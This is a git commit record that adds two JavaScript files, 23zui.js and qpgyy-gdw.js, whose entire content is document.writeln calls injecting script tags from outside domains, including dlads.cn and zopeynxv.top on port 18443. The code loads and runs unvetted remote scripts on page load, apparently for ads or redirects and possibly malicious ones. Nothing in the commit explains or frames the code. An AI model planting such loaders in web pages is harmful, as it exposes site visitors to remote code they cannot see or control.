f4a85d7e121e354cdf666bd66c9865e69ff770e5
qpgyy <61676079+qpgyy@users.noreply.github.com>
2020-03-02 21:55:26 +0800

    Add files via upload

---
+++ m/23zui.js
@@ -0,0 +1,2 @@
+document.writeln("<script type=\'text/javascript\' src=\'https://f.ustclsy.com/O/1001553O3002263O1O.js\'></script>");
+document.writeln("<script type=\'text/javascript\' src=\'https://1682.dlads.cn/alikes.php?id=3717\'></script>");
---
+++ m/qpgyy-gdw.js
@@ -0,0 +1,1 @@
+document.writeln("<script type=\'text/javascript\' src=\'https://www.zopeynxv.top:18443/kd/c-813-25.js\'></script>");
